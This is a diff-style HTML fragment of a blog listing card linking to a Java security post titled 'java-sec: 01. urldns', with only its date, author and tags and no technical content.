-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/07/01/java-sec-01-urldns/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="java-sec: 01. urldns">
-                        
-                        <span class="card-title">java-sec: 01. urldns</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-01
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            outlaws
-                            
-                        </span>
-                    </div>
-                </div>
-
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/java/">
-                        <span class="chip bg-color">java</span>
-                    </a>
-                    
-                    <a href="/tags/urldns/">
-                        <span class="chip bg-color">urldns</span>
                     </a>
                     
                 </div>
